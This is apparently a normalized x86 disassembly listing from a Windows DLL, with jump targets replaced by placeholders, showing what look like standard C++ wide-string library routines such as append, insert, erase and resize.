mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10024c40
add esp 0xc
test eax eax
je r-xdata
sub_1003fb75
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_1003f2c3
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f677
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_1003f40c
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1003fbb1
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1003f677
dec [ ebp + 0x18 ]
jne r-xdata
sub_1003fbdc
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1003f084
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
sub_1003fc29
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
pop ebp
retn 0x4
sub_1003fc4c
push 0x10
mov eax sub_1004be86
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003779
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_10024c18
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_1000847e
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_1003e7c1
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_1003e7c1
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_1003e7c1
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_1003e793
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_1003e793
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_100282db
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10026f10
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_10026f10
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10048527
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10048527
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1003fdb2
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1003f606
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1003fddb
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1003f123
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1003fe54
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003f108
add esp 0x14
leave
retn
sub_1003fe73
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003f266
add esp 0x14
leave
retn
sub_1003fe92
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1003fddb
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1003fddb
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_1003fed1
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_1003f704
mov eax esi
call sub_100282db
retn 0xc
sub_1003ff24
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003ff0c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003ff45
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1003f92e
mov eax esi
call sub_100282db
retn 0x10
sub_1003ff81
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003fe25
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_1003ffa5
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1003fc4c
mov eax esi
call sub_100282db
retn 0x10
sub_1003ffe1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1003f869
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10040026
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_10022f7c
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp + 0x8 ] edx
mov ebx [ edx ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
sub eax ebx
push eax
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x4 ]
sub ecx edi
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_1003fe73
mov eax [ esi + 0x14 ]
add esp 0x10
sub eax ebx
push eax
mov ecx esi
call sub_1003fc29
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_100400a8
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003fe25
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_100400d2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_1003fc29
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_100242e6
pop ecx
pop edi
push [ ebp + 0xc ]
push edi
push 0x8
push eax
call sub_1003fe54
add esp 0x10
sub_1004011f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1003f4dc
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1004014e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_1003f4dc
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10040180
push 0xc
mov eax sub_1004bec4
call sub_10028236
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
mov ecx edi
call sub_1003fe3f
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_100400d2
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_1003fc29
call sub_100282db
retn 0x8
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1003fe54
add esp 0x10
sub_1004027f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ff45
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_100402a4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003f009
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100402cb
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ff45
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_100402f0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003f009
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10040317
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ffa5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1004033c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003f53f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10040363
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ffa5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10040388
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003f53f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10040402
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_10022f44
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_10040180
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
push edi
mov ecx esi
call sub_1003fc29
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_100400d2
jmp r-xdata
mov eax edi
sub_10040499
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_10022f7c
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_10022f44
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10040402
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx * 2 ]
sub eax ecx
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_1003fe54
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_1003fc29
sub_10040544
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_10022f44
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_10040402
test al al
je r-xdata
pop esi
push [ ebp + 0xc ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_1003fbdc
push esi
mov ecx edi
call sub_1003fc29
sub_10040596
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_10022f7c
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_10022f44
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_100016c7
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + edi * 2 ]
push edx
mov edx [ ebp + 0xc ]
sub eax edi
sub eax edx
push eax
lea eax [ edi + edx ]
lea eax [ ecx + eax * 2 ]
push eax
call j_sub_10001a0b
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_100051ee
push ebx
mov ecx esi
call sub_100016a9
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_10040636
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_10022f7c
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_10040402
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10040026
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10040026
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
lea edx [ edi + edx * 2 ]
push edx
push ecx
push eax
call sub_1003fe54
add esp 0x10
push esi
mov ecx ebx
call sub_1003fc29
sub_100406cb
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1003f49d
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_10040402
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_10040636
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_1003fe54
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_1003fc29
sub_10040741
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_100246bb
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_100406cb
pop esi
pop ebp
retn 0x4
sub_10040762
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_10040402
test al al
je r-xdata
call sub_10022f44
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_1003fbdc
push edi
mov ecx esi
call sub_1003fc29
sub_100407a3
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_10022f7c
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_10022f44
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_10040402
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + edi * 2 ]
push edx
mov edx [ ebp + 0xc ]
sub eax edi
sub eax edx
push eax
lea eax [ edi + edx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1003fe73
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_1003fbdc
push ebx
mov ecx esi
call sub_1003fc29
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_10040843
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10040544
push 0xffffffff
push eax
call sub_10040026
jmp r-xdata
pop ebp
retn 0x8
sub_1004086b
push 0x38
mov eax sub_1004bee7
call sub_1002826c
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x44 ] eax
test cx cx
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_100079fe
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
movzx eax cx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x40 ]
call sub_100282ef
retn
movzx eax [ esi + edi * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ esi + edx * 2 ]
test ax ax
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
movzx ecx [ esi ]
cmp ax cx
jne r-xdata
add edi [ ebp - 0x38 ]
movzx eax [ esi + edi * 2 ]
cmp ax [ esi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
movsx eax [ eax ]
add edi eax
jmp r-xdata
inc edi
movzx eax [ esi + edi * 2 ]
test ax ax
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test ax ax
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ax cx
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1003fe92
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_10040010
cmp [ esi + edi * 2 ] ax
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1003fe92
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_1003fdb2
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
sub_100409cc
push 0x4c
mov eax sub_1004bf14
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_10003d21
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_10007a24
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x48 ]
push eax
call sub_10033675
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
and [ ebp - 0x50 ] 0x0
push 0x1
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
dec edi
call sub_10010e6d
mov ecx eax
call sub_1003ffe1
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
cmp edi esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push esi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
call sub_10002020
mov eax edi
call sub_100282ef
retn 0x20
add ebx 0xc
xor eax eax
jle r-xdata
push ebx
lea eax [ ebp - 0x50 ]
push eax
push edi
lea ecx [ ebp - 0x3c ]
call sub_100084d4
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1002382a
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push eax
lea ecx [ ebp - 0x3c ]
sub edi eax
call sub_1003f869
push [ ebp - 0x44 ]
lea ecx [ ebp + 0xc ]
call sub_10007c55
cmp edi esi
ja r-xdata
cmp eax esi
jl r-xdata
jne r-xdata
cmp [ ebp - 0x44 ] si
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_100084d4
push eax
call sub_10024630
pop ecx
inc eax
jmp r-xdata
sub_10040b0d
push 0x4c
mov eax sub_1004bf14
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi r--data
